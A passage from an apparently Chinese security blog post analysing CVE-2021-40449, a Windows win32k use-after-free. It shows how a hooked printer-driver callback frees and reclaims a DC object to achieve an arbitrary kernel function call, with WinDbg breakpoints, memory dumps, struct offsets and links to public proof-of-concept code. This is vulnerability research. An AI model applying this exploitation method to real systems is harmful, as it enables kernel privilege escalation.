&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HmgSwapLockedHandleContents&lt;/span>(v3, &lt;span style="color:#ae81ff">0&lt;/span>i64, v6, &lt;span style="color:#ae81ff">0&lt;/span>i64, v23);&lt;span style="color:#75715e">// 交换旧的和新的HDC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">GreReleaseHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 删除HDC句柄对应的DC对象。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">bDeleteDCInternal&lt;/span>(v6, &lt;span style="color:#ae81ff">1&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果在释放DC对象之后，重新申请DC对象空间，修改里面的函数指针内容，并通过某些步骤，让内核执行DC对象内的函数指针，即可达到&lt;strong>use步骤&lt;/strong>让内核执行任意内核函数。&lt;/p>
&lt;h3 id="漏洞利用分析">漏洞利用分析&lt;/h3>
&lt;p>POC:
&lt;a href="https://github.com/KaLendsi/CVE-2021-40449-Exploit" target="_blank">https://github.com/KaLendsi/CVE-2021-40449-Exploit&lt;/a>&lt;/p>
&lt;p>POC代码分析：
&lt;a href="https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp" target="_blank">https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp&lt;/a>&lt;/p>
&lt;p>要利用该漏洞，难点在于free DC对象之后怎么使得内核再次调用DC对象的函数指针，在正常GreResetDCInternal函数流程中，是先调用DC对象的函数指针再删除这个对象，即按照正常流程即不会有use-after-free的条件。&lt;/p>
&lt;p>在ring 3层调用ResetDC函数会通过系统调用进入内核调用函数NtGdiResetDC，在NtGdiResetDC会调用漏洞函数GreResetDCInternal，在GreResetDCInternal中会调用DC对象里面的函数指针。要利用该漏洞即要在调用函数指针之前完成三步动作：&lt;strong>1、释放DC对象2、重新申请原DC对象的内存空间3、完成内存空间的布局&lt;/strong>。&lt;/p>
&lt;p>在函数&lt;strong>GreResetDCInternal&lt;/strong>调用DC对象的函数指针之前会调用&lt;strong>win32kbase!hdcOpenDCW&lt;/strong>函数。&lt;strong>win32kbase!hdcOpenDCW&lt;/strong>函数会执行打印机驱动的用户态回调函数表里面的函数，该表里面存放了函数指针，该函数指针原先指向的是预定义的回调函数。在POC中覆盖这个函数指针，使其执行POC定义的回调函数。&lt;/p>
&lt;p>在自定义回调函数中再次执行ResetDC函数并传入同一HDC句柄，则会再次执行NtGdiResetDC和GreResetDCInternal函数，而在GreResetDCInternal的后半段，会释放传入的HDC对应的DC对象并创建新的DC对象。&lt;strong>此时达到了free步骤&lt;/strong>。&lt;/p>
&lt;p>在第二次ResetDC调用完成后，原DC对象已被释放，此时可以重新申请原DC对象的内存空间并完成内存布局，将原DC对象的函数指针和函数指针的参数的位置设置为想要执行的内核函数的地址及参数。在执行完第一次回调之后，GreResetDCInternal 将调用原DC对象内的函数指针，即完成了任意内核函数调用，&lt;strong>此时达到了use步骤&lt;/strong>。&lt;/p>
&lt;p>完整调用链如下图：&lt;/p>
&lt;p>
&lt;img alt="调用链" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" />&lt;/p>
&lt;p>其中漏洞相关的类定义如下，参考https://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DCLEVEL&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HDC hdcSave;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DC&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> OBJECT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DHPDEV dhpdev_;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PDEV &lt;span style="color:#f92672">*&lt;/span>ppdev_;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HDC hdcNext_; &lt;span style="color:#75715e">// HDC链表指针
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HDC hdcPrev_;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCLEVEL dclevel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> DC &lt;span style="color:#f92672">*&lt;/span>PDC;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">XDCOBJ&lt;/span> &lt;span style="color:#75715e">/* dco */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PDC pdc;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> XDCOBJ &lt;span style="color:#f92672">*&lt;/span>PXDCOBJ;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DCOBJ&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> XDCOBJ &lt;span style="color:#75715e">/* mdo */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ() { pdc &lt;span style="color:#f92672">=&lt;/span> (PDC) NULL; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ(HDC hdc) { vLock(hdc); }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">~&lt;/span>DCOBJ() { vUnlockNoNullSet(); }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> DCOBJ &lt;span style="color:#f92672">*&lt;/span>PDCOBJ;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>类之间的关系可以简化为下图：&lt;/p>
&lt;p>
&lt;img alt="对象关系图" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg" />&lt;/p>
&lt;h3 id="调试">调试&lt;/h3>
&lt;h4 id="free部分">free部分&lt;/h4>
&lt;p>在free部分需要把我们想要释放的内存空间释放，并让后面的use部分成功申请到这块内存空间。&lt;/p>
&lt;p>调试环境：虚拟机windows 10 1607、物理机windows 10 2004&lt;/p>
&lt;p>POC:
&lt;a href="https://github.com/KaLendsi/CVE-2021-40449-Exploit" target="_blank">https://github.com/KaLendsi/CVE-2021-40449-Exploit&lt;/a>&lt;/p>
&lt;p>断点:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">NtGdiResetDC&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">NtGdiResetDC&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xc1&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用GreResetDCInternal函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x3a&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用DCOBJ构造函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x116&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用_imp_hdcOpenDCW函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x136&lt;/span> &lt;span style="color:#e6db74">&amp;#34;第二次DCOBJ&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x1b5&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用DC对象函数指针&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x1d1&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用HmgSwapLockedHandle函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kfull&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GreResetDCInternal&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x20d&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用_imp_bDeleteDCInternal函数&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">cve_2021_40449&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">hook_DrvEnablePDEV&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x12a&lt;/span> &lt;span style="color:#e6db74">&amp;#34;循环调用&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bp&lt;/span> &lt;span style="color:#a6e22e">win32kbase&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">PALMEMOBJ&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">bCreatePalette&lt;/span> &lt;span style="color:#e6db74">&amp;#34;调用win32kbase!PALMEMOBJ::bCreatePalette&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行POC，断点&lt;code>bp win32kfull!NtGdiResetDC&lt;/code>触发此时传入的句柄为&lt;code>rcx=00000000092105f1&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="NtGdiResetDC" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110112401943.png" />&lt;/p>
&lt;p>第一次调用&lt;code>win32kfull!GreResetDCInternal&lt;/code> 时传入各个参数为&lt;code>rcx=00000000092105f1&lt;/code> &lt;code>rdx=0000000000000000&lt;/code> &lt;code>r8=ffffb101aadf2a44&lt;/code> 即第一个句柄值为&lt;code>00000000092105f1&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="image-20211110143416643" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110143416643.png" />&lt;/p>
&lt;p>第一次调用构造函数，利用DC对象创建DCO对象，此时rbx存放DCO对象的地址，&lt;/p>
&lt;p>
&lt;img alt="image-20211110151223865" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110151223865.png" />&lt;/p>
&lt;p>根据&lt;strong>漏洞形成分析&lt;/strong>的计算公式，可以很方便的得到DC对象内的函数指针指向的函数的地址为：&lt;code>ffffd548a1f10c30&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29c0 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29d0 &lt;span style="color:#ae81ff">0000026&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">6e766&lt;/span>b20 &lt;span style="color:#ae81ff">000000&lt;/span>d7&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>aff680
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29e0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">092105f&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf29f0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a00 ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2b80 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f18fe6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a10 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a20 ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a44 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb101&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>aadf2a30 &lt;span style="color:#ae81ff">000000&lt;/span>d7&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>aff5d0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// rbx存放了构造函数产生的DCO对象地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">092105f&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d020 ffffd800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b45ad780 &lt;span style="color:#ae81ff">0000026&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">6e75&lt;/span>ea10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d030 &lt;span style="color:#ae81ff">00100010&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d050 ffffd800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b56f1260 &lt;span style="color:#ae81ff">0000000&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>a01f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d060 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d3d0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">88000&lt;/span>b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d070 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000004f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00005&lt;/span>d90
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d080 &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ffffd50e`041fd010为rbx的值，此处ffffd50e`041fd010+0x30为PDC的地址，PDC指向DC对象即DC对象地址为ffffd50e`00052030
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 计算公式 *(dco地址+0x30)=dc地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d050 ffffd800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b56f1260 &lt;span style="color:#ae81ff">0000000&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>a01f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d060 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d3d0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">88000&lt;/span>b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d070 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000004f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00005&lt;/span>d90
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d080 &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d090 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d0a0 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00001&lt;/span>a10 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00004&lt;/span>cb0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d0b0 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000105f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ffffd50e`00052030+0xad0处为DC对象的函数指针，该指针指向了一个函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 计算公式 *(dc地址 +0xad0)=函数地址
